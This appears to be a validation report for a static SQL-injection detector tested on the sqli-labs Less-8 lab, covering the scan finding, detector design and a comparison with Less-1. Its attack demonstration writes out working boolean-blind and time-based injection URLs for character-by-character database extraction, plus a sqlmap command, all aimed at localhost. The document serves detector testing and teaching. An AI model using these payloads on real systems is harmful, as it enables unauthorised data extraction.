# SQL Injection Detector - Validation Report: Less-8

## Overview

| Item | Value |
|------|-------|
| Target | sqli-labs/Less-8 (Blind - Boolean-based SQL Injection) |
| Expected Vulnerability | SQL query with variable interpolation |
| Test Date | 2026-01-07 |

---

## 1. Scan Result

```
============================================================
SQL INJECTION DETECTOR REPORT
SCAN SUMMARY
Timestamp:       2026-01-07T22:12:12.718474
Files Scanned:   1
Total Findings:  1
Detectors Run:   classic, blind, oob, stacked
============================================================
RESULTS BY FILE

[VULNERABLE] test\sqli-labs\Less-8\index.php
  Finding #1
    Detector:    classic
    Type:        string_concat
    Severity:    HIGH
    Location:    Line 29, Column 6
    Pattern:     double_quote_sql_variable
    Description: SQL query in double quotes with variable interpolation
    Code:        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
============================================================
END OF REPORT
```

### Analysis

| Category | Count |
|----------|-------|
| True Positive | 1 |
| False Positive | 0 |
| False Negative | 0 |

**True Positive (Correct):**
- Line 29: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

---

## 2. Blind Detector Behavior

### Why Blind Detector Did Not Fire

The Blind Detector is designed to detect **attack payload patterns** (e.g., `SLEEP()`, `IF()`, `OR 1=1`), not vulnerable code structures.

| Detector | Target | Less-8 Source |
|----------|--------|---------------|
| Classic | Vulnerable code construction (variable interpolation) | ✓ Present → Detected |
| Blind | Attack payload strings in source/logs | ✗ Not present → Expected |

### Key Distinction

| Term | Meaning |
|------|---------|
| Blind SQL Injection (Attack Technique) | Exploitation method when no error output is available |
| Blind Detector (Tool Component) | Pattern matcher for attack payload strings |

The "Blind" classification describes the **exploitation technique**, not a different code pattern. The vulnerable code structure is identical to Less-1 (Error-based).

```
Vulnerable Code Structure → Detected by Classic Detector ✓
                         ↓
              Attacker chooses technique:
              ├── Error-based (read from error messages)
              ├── UNION-based (combine results)
              ├── Boolean-blind (infer via true/false)
              ├── Time-blind (infer via SLEEP delay)
              └── Stacked (execute multiple queries)
```

---

## 3. Code Comparison: Less-1 vs Less-8

### Vulnerable Code (Identical)

| Lesson | Line 29 |
|--------|---------|
| Less-1 | `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";` |
| Less-8 | `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";` |

### Response Handling (Different)

**Less-1 (Error-based):**
```php
echo 'Your Login name:'. $row['username'];
echo 'Your Password:' .$row['password'];
// Error messages displayed
```

**Less-8 (Blind):**
```php
if($row)
{
    echo 'You are in...........';  // Success: generic message only
}
else 
{
    // Failure: no data, no error
}
```

The difference is in **application-layer response logic**, not SQL construction. Static pattern analysis correctly identifies the root vulnerability in both cases.

---

## 4. Attack Demonstration

### Detected Vulnerability

| Item | Value |
|------|-------|
| File | Less-8/index.php |
| Line | 29 |
| Vulnerable Code | `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";` |

### Blind vs Error-based: Attack Difference

| Aspect | Less-1 (Error-based) | Less-8 (Blind) |
|--------|---------------------|----------------|
| Response on success | Shows username/password | "You are in..........." |
| Response on failure | Shows error message | Empty/no output |
| Data extraction | Direct from output | Infer via true/false |

### Attack Scenarios

#### Step 1: Normal Access
```
http://localhost/sqli-labs/Less-8/?id=1
```
| Response |
|----------|
| You are in........... |

→ Generic success message, no actual data displayed.

#### Step 2: Confirm Vulnerability (Boolean Test)
```
http://localhost/sqli-labs/Less-8/?id=1' AND '1'='1
```
| Response |
|----------|
| You are in........... |

```
http://localhost/sqli-labs/Less-8/?id=1' AND '1'='2
```
| Response |
|----------|
| (empty) |

→ Different responses confirm SQL injection vulnerability.

#### Step 3: Extract Data Length
```
http://localhost/sqli-labs/Less-8/?id=1' AND LENGTH(database())=8--+
```
| Response |
|----------|
| You are in........... |

→ Database name is 8 characters long (binary search to find this).

#### Step 4: Extract Data Character by Character
```
http://localhost/sqli-labs/Less-8/?id=1' AND SUBSTRING(database(),1,1)='s'--+
```
| Response |
|----------|
| You are in........... |

→ First character of database name is 's'.

**Full extraction process:**
```
SUBSTRING(database(),1,1)='s' → true
SUBSTRING(database(),2,1)='e' → true
SUBSTRING(database(),3,1)='c' → true
...
Database name: "security" (8 characters, requires ~8×26 requests worst case)
```

#### Step 5: Time-based Alternative
```
http://localhost/sqli-labs/Less-8/?id=1' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--+
```
| Response |
|----------|
| (5 second delay) |

→ If response is delayed, condition is true.

### Attack Flow Diagram
```
Boolean-based Blind Injection:

Original Query:
  SELECT * FROM users WHERE id='1' LIMIT 0,1
  → Returns row → "You are in..."

Injected Query (True condition):
  SELECT * FROM users WHERE id='1' AND '1'='1' LIMIT 0,1
  → Returns row → "You are in..."

Injected Query (False condition):
  SELECT * FROM users WHERE id='1' AND '1'='2' LIMIT 0,1
  → Returns nothing → (empty response)

Attacker infers data by observing which conditions return true/false.
```

### Automation Note

Blind injection typically requires many requests to extract data. Tools like sqlmap automate this:

```bash
sqlmap -u "http://localhost/sqli-labs/Less-8/?id=1" --technique=B --dbs
```

### Impact Summary

| Risk | Description |
|------|-------------|
| Data Breach | Attacker can extract all data (slower than error-based) |
| Authentication Bypass | Credentials extractable character by character |
| Stealth | No error messages = harder to detect in logs |
| Automation | Tools can fully automate blind extraction |

---

## 5. Detector Design Note

### Current Detector Roles

| Detector | Primary Purpose |
|----------|-----------------|
| **Classic** | Detect vulnerable code structures (main detection) |
| **Blind** | Detect attack payload patterns in logs/test code |
| **OOB** | Detect dangerous SQL functions (LOAD_FILE, etc.) |
| **Stacked** | Detect multi-statement execution patterns |

### Why This Design

The root vulnerability (unsanitized input in SQL) is the same regardless of exploitation technique. Classic Detector catches this at the source level, which is the correct approach for static analysis.

---

## Conclusion

- ✓ Primary vulnerability correctly detected (Line 29)
- ✓ No false positives
- ✓ Blind Detector non-firing is expected behavior (design, not bug)
- ✓ Same vulnerability as Less-1, different exploitation technique